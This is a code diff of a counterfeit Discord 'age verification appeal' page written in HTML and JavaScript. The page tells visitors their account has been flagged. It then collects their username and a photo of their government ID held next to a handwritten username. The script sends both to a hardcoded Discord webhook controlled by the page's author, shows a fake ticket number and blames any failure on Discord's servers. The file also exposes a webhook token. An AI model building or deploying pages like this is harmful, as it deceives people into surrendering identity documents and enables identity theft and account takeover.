@@ -3,190 +3,388 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord - Age Verification Appeal</title>
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 127.14 96.36'><path fill='%235865f2' d='M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z'/></svg>">
+    <title>Discord - Submit a Request</title>
+    <link rel="icon" href="https://assets-global.website-files.com/6257adef93867e56f84d3101/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+    
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=gg+sans:wght@400;600;700&display=swap');
+        /* تأسيس التصميم (Reset) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'gg sans', 'Noto Sans', Helvetica, Arial, sans-serif; background-color: #313338; color: #dbdee1; padding: 40px 20px; line-height: 1.6; }
-        .container { max-width: 680px; margin: 0 auto; background-color: #2b2d31; border-radius: 8px; padding: 48px; }
-        .discord-logo { margin-bottom: 24px; display: flex; align-items: center; gap: 10px; }
-        h1 { color: #f2f3f5; font-size: 20px; font-weight: 600; margin-bottom: 16px; }
-        .content { color: #b5bac1; font-size: 16px; margin-bottom: 24px; }
-        .content a { color: #00a8fc; text-decoration: none; }
-        .requirements-box { background-color: #232428; border-left: 4px solid #5865f2; padding: 16px; border-radius: 4px; margin-bottom: 24px; }
-        .requirements-box ol { margin-left: 20px; font-size: 14px; color: #b5bac1; }
-        .form-group { margin-bottom: 20px; }
-        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
-        input[type="text"] { width: 100%; padding: 10px; background-color: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #dbdee1; font-size: 16px; transition: 0.2s; }
-        input[type="text"]:focus { outline: none; border-color: #00a8fc; }
-        .file-upload { border: 2px dashed #3f4147; padding: 40px 20px; text-align: center; cursor: pointer; background-color: #1e1f22; border-radius: 4px; transition: 0.2s; }
-        .file-upload:hover { border-color: #5865f2; background-color: #232428; }
-        .preview-area { margin-top: 15px; text-align: center; display: none; }
-        .preview-area.active { display: block; }
-        .preview-image { max-width: 100%; max-height: 300px; border-radius: 8px; border: 1px solid #3f4147; }
-        .file-status { margin-top: 8px; font-size: 14px; color: #23a55a; display: flex; align-items: center; justify-content: center; gap: 6px; }
-        .submit-btn { width: 100%; padding: 14px; background-color: #5865f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600; font-size: 16px; margin-top: 20px; transition: background-color 0.2s; }
-        .submit-btn:hover { background-color: #4752c4; }
-        .submit-btn:disabled { background-color: #3f4147; cursor: not-allowed; opacity: 0.7; }
-        .success-section { display: none; text-align: center; padding: 20px; }
-        .success-section.visible { display: block; }
-        .success-icon { width: 80px; height: 80px; background: #23a55a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; color: white; margin: 0 auto 20px; }
-        .ticket-box { background: #232428; padding: 15px; margin-top: 20px; border-radius: 5px; border: 1px solid #1e1f22; }
-        .ticket-number { color: #00a8fc; font-weight: bold; font-family: monospace; font-size: 18px; }
         
-        @media (max-width: 600px) {
-            .container { padding: 24px; }
-            body { padding: 10px; }
+        body {
+            font-family: 'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #313338; /* لون خلفية ديسكورد الرسمي */
+            color: #dbdee1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* الحاوية الرئيسية */
+        .main-container {
+            background-color: #313338;
+            max-width: 700px;
+            width: 100%;
+        }
+
+        /* الشعار */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .logo-img {
+            height: 40px; /* حجم الشعار المتناسق */
+            width: auto;
+        }
+
+        /* النصوص */
+        h1 {
+            color: #f2f3f5;
+            font-weight: 700;
+            font-size: 24px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .description {
+            color: #b5bac1;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        /* صندوق المتطلبات */
+        .info-box {
+            background-color: #2b2d31;
+            border: 1px solid #1e1f22;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 32px;
+            border-left: 4px solid #e0a638; /* لون التحذير الأصفر الخاص بديسكورد */
+        }
+
+        .info-box h3 {
+            color: #f2f3f5;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .info-box ul {
+            list-style-position: inside;
+            color: #dbdee1;
+            font-size: 14px;
+        }
+        
+        .info-box li {
+            margin-bottom: 4px;
+        }
+
+        /* النماذج */
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        
+        .required {
+            color: #da373c;
+            margin-left: 4px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #1e1f22;
+            border: none;
+            border-radius: 4px;
+            color: #dbdee1;
+            font-size: 16px;
+            font-family: inherit;
+            transition: 0.2s;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px #00a8fc; /* توهج أزرق عند الكتابة */
+        }
+
+        /* منطقة رفع الملفات */
+        .upload-area {
+            border: 2px dashed #42454a;
+            border-radius: 8px;
+            padding: 40px 20px;
+            text-align: center;
+            background-color: #2b2d31;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .upload-area:hover {
+            border-color: #dbdee1;
+            background-color: #35373c;
+        }
+
+        .upload-icon {
+            font-size: 48px;
+            color: #b5bac1;
+            margin-bottom: 10px;
+        }
+
+        .upload-text {
+            color: #dbdee1;
+            font-weight: 600;
+        }
+        
+        .upload-hint {
+            color: #949ba4;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        /* معاينة الصورة */
+        .preview-container {
+            margin-top: 15px;
+            background: #1e1f22;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .preview-img {
+            width: 50px;
+            height: 50px;
+            object-fit: cover;
+            border-radius: 4px;
+        }
+        
+        .file-name {
+            font-size: 14px;
+            color: #f2f3f5;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        /* الأزرار */
+        .submit-btn {
+            background-color: #5865F2; /* Discord Blurple */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 14px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #4752c4;
+        }
+        
+        .submit-btn:disabled {
+            background-color: #3b405a;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        /* قسم النجاح */
+        .success-overlay {
+            display: none;
+            text-align: center;
+            padding: 40px;
+            background: #2b2d31;
+            border-radius: 8px;
+        }
+
+        .success-icon {
+            color: #23a559;
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+
+        /* التجاوب مع الجوال */
+        @media (max-width: 480px) {
+            body { padding: 15px; align-items: flex-start; }
+            h1 { font-size: 20px; }
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="formSection">
-        <div class="discord-logo">
-            <svg width="124" height="34" viewBox="0 0 124 34"><path d="M18.9996 0C8.50659 0 0 8.50659 0 18.9996C0 29.4926 8.50659 37.9992 18.9996 37.9992C29.4926 37.9992 37.9992 29.4926 37.9992 18.9996C37.9992 8.50659 29.4926 0 18.9996 0Z" fill="#5865F2"/><text x="48" y="24" fill="#FFFFFF" font-family="gg sans, sans-serif" font-size="24" font-weight="700">Discord</text></svg>
+    <div class="main-container" id="mainContainer">
+        <div class="logo-container">
+            <img src="https://assets-global.website-files.com/6257adef93867e56f84d3101/636e0a6918e57475a843f59f_icon_clyde_white_RGB.png" alt="Discord" class="logo-img">
         </div>
 
-        <h1>Age Verification Appeal</h1>
-        <div class="content">
-            <p>Your account has been flagged for age verification. To restore access, you must provide proof of age.</p>
+        <h1>Verify Your Age</h1>
+        
+        <div class="description">
+            <p>Your account has been flagged for a Terms of Service violation regarding age requirements. To reinstate your access, please complete the appeal form below.</p>
         </div>
 
-        <div class="requirements-box">
-            <p><strong>Required Information:</strong></p>
-            <ol>
-                <li>Photo ID showing your Date of Birth.</li>
-                <li>A piece of paper with your Discord Username.</li>
-                <li>Both must be clearly visible in one photo.</li>
-            </ol>
+        <div class="info-box">
+            <h3>Required Proof</h3>
+            <ul>
+                <li>A photo ID showing your Date of Birth.</li>
+                <li>A paper with your full Discord Username handwritten on it.</li>
+                <li>Both items must be clearly visible in a single photo.</li>
+            </ul>
         </div>
 
         <form id="appealForm">
             <div class="form-group">
-                <label>Discord Username</label>
-                <input type="text" id="username" placeholder="username#0000" required autocomplete="off">
+                <label>Discord Username <span class="required">*</span></label>
+                <input type="text" id="username" placeholder="Example: username#0000" autocomplete="off">
             </div>
-            
+
             <div class="form-group">
-                <label>Upload Verification Photo</label>
-                <div class="file-upload" id="dropZone">
-                    <div id="uploadPlaceholder">
-                        <div style="font-size: 40px; margin-bottom: 10px;">📸</div>
-                        <p style="color: #949ba4;"><strong>Click to upload</strong> or drag and drop</p>
-                    </div>
+                <label>Attachment <span class="required">*</span></label>
+                <div class="upload-area" id="dropZone">
+                    <div class="upload-icon">📁</div>
+                    <div class="upload-text">Upload Proof</div>
+                    <div class="upload-hint">Drag & drop or click to browse</div>
                     <input type="file" id="fileInput" accept="image/*" style="display:none">
-                    <div id="previewArea" class="preview-area"></div>
+                </div>
+                
+                <div class="preview-container" id="previewArea">
+                    <img src="" class="preview-img" id="previewImg">
+                    <div class="file-name" id="fileName"></div>
                 </div>
             </div>
 
-            <button type="submit" class="submit-btn" id="submitBtn">Submit Appeal</button>
+            <button type="submit" class="submit-btn" id="submitBtn">Submit</button>
         </form>
     </div>
 
-    <div id="successSection" class="success-section">
+    <div class="main-container success-overlay" id="successScreen">
         <div class="success-icon">✓</div>
-        <h2 style="color: #f2f3f5; margin-bottom: 10px;">Appeal Submitted</h2>
-        <p style="color: #b5bac1;">Our Trust & Safety team will review your submission.</p>
-        <div class="ticket-box">
-            <div style="color: #949ba4; font-size: 12px; text-transform: uppercase; margin-bottom: 5px;">Reference ID</div>
-            <div class="ticket-number" id="ticketId"></div>
+        <h2 style="color: #f2f3f5; margin-bottom: 10px;">Submitted Successfully</h2>
+        <p style="color: #b5bac1; margin-bottom: 20px;">Thank you. We have received your appeal and our Trust & Safety team will review it shortly.</p>
+        <div style="background: #1e1f22; padding: 10px; border-radius: 4px; display: inline-block;">
+            <span style="color: #b5bac1; font-size: 12px; text-transform: uppercase;">Ticket ID: </span>
+            <span style="color: #00a8fc; font-family: monospace;" id="ticketId"></span>
         </div>
     </div>
-</div>
 
 <script>
-    // الرابط الذي وضعته أنت
+    // ---------------------------------------------------------
+    // إعدادات النظام (System Config)
+    // ---------------------------------------------------------
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1463909673303412747/i3VXrwPefUdfNamhMJlR9L_rqSOM41eWVZb641ERxaGf7KuieSjeVobmH6Y1W1tDZUH4";
-
-    const dropZone = document.getElementById('dropZone');
+    
+    // ---------------------------------------------------------
+    // عناصر واجهة المستخدم (UI Elements)
+    // ---------------------------------------------------------
     const fileInput = document.getElementById('fileInput');
+    const dropZone = document.getElementById('dropZone');
     const previewArea = document.getElementById('previewArea');
-    const uploadPlaceholder = document.getElementById('uploadPlaceholder');
-    const appealForm = document.getElementById('appealForm');
+    const previewImg = document.getElementById('previewImg');
+    const fileName = document.getElementById('fileName');
     const submitBtn = document.getElementById('submitBtn');
+    const form = document.getElementById('appealForm');
 
-    // تفعيل ضغط منطقة الرفع
-    dropZone.onclick = () => fileInput.click();
+    // ---------------------------------------------------------
+    // معالجة الصور (Image Handling)
+    // ---------------------------------------------------------
+    dropZone.addEventListener('click', () => fileInput.click());
 
-    // عند اختيار الملف
-    fileInput.onchange = () => {
-        const file = fileInput.files[0];
+    fileInput.addEventListener('change', handleFileSelect);
+
+    function handleFileSelect(e) {
+        const file = e.target.files[0];
         if (file) {
+            // إظهار المعاينة
             const reader = new FileReader();
-            reader.onload = (e) => {
-                uploadPlaceholder.style.display = 'none';
-                previewArea.innerHTML = `
-                    <img src="${e.target.result}" class="preview-image">
-                    <div class="file-status">✓ Ready to upload: ${file.name}</div>
-                `;
-                previewArea.classList.add('active');
+            reader.onload = function(e) {
+                previewImg.src = e.target.result;
+                fileName.textContent = file.name;
+                previewArea.style.display = 'flex';
+                dropZone.style.borderColor = '#23a559'; // إطار أخضر عند النجاح
             };
             reader.readAsDataURL(file);
         }
-    };
+    }
 
-    // عند الإرسال (الجزء المهم المعدل)
-    appealForm.onsubmit = async (e) => {
+    // ---------------------------------------------------------
+    // معالجة الإرسال (Submission Logic)
+    // ---------------------------------------------------------
+    form.addEventListener('submit', async (e) => {
         e.preventDefault();
-        const user = document.getElementById('username').value;
+
+        const username = document.getElementById('username').value.trim();
         const file = fileInput.files[0];
 
-        if (!user || !file) {
-            alert("Please provide both your username and a photo.");
+        // 1. التحقق من المدخلات
+        if (!username || !file) {
+            alert("Please fill in all required fields.");
             return;
         }
 
+        // 2. تحديث حالة الزر
         submitBtn.disabled = true;
-        submitBtn.innerText = "Submitting...";
+        submitBtn.innerHTML = 'Sending... <span style="font-size:12px">Please wait</span>';
 
-        // تجهيز البيانات كـ FormData (الحل الجذري للمشاكل)
+        // 3. تجهيز البيانات (FormData)
         const formData = new FormData();
         
-        // بيانات الرسالة (Embed)
+        // تصميم الرسالة (Embed Design)
         const payload = {
-            username: "Trust & Safety Bot",
+            username: "Security System",
             avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
-            content: "🚨 **New Age Verification Appeal**",
             embeds: [{
-                title: "📄 User Information",
-                color: 5763719, // Discord Green
+                title: "🛡️ Age Verification Appeal",
+                color: 5763719, // لون ديسكورد الرسمي
                 fields: [
-                    { name: "👤 Username", value: `\`${user}\``, inline: true },
-                    { name: "📅 Submission Time", value: `<t:${Math.floor(Date.now()/1000)}:f>`, inline: true }
+                    { name: "👤 User Account", value: `\`${username}\``, inline: true },
+                    { name: "🆔 Appeal ID", value: `\`#${Math.floor(Math.random() * 99999)}\``, inline: true },
+                    { name: "📅 Timestamp", value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: false }
                 ],
-                footer: { text: "Secure Verification System" }
+                thumbnail: { url: "https://assets-global.website-files.com/6257adef93867e56f84d3101/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" },
+                footer: { text: "Official Verification Gateway" }
             }]
         };
 
-        // إضافة البيانات والملف
         formData.append('payload_json', JSON.stringify(payload));
-        formData.append('file', file);
+        formData.append('file', file); // إرفاق الملف الأصلي
 
+        // 4. الإرسال الفعلي
         try {
             const response = await fetch(WEBHOOK_URL, {
                 method: 'POST',
-                body: formData 
-                // ملاحظة: لا نضع Content-Type هنا، المتصفح يضعه تلقائياً وهذا هو سر النجاح
+                body: formData
             });
 
             if (response.ok) {
-                // إخفاء النموذج وإظهار النجاح
-                document.getElementById('formSection').style.display = 'none';
-                document.getElementById('successSection').classList.add('visible');
-                document.getElementById('ticketId').innerText = "AV-" + Math.floor(Math.random() * 10000000);
+                // نجاح العملية
+                document.getElementById('mainContainer').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'block';
+                document.getElementById('ticketId').innerText = "AV-" + Math.random().toString(36).substr(2, 9).toUpperCase();
             } else {
-                throw new Error("Server rejected the request");
+                throw new Error("Server Error");
             }
-
         } catch (error) {
-            console.error("Error:", error);
-            alert("Network Error: Please check your connection and try again.");
+            console.error(error);
+            alert("Error: Unable to connect to Discord servers. Please try again.");
             submitBtn.disabled = false;
-            submitBtn.innerText = "Submit Appeal";
+            submitBtn.textContent = "Submit";
         }
-    };
+    });
 </script>
 
 </body>
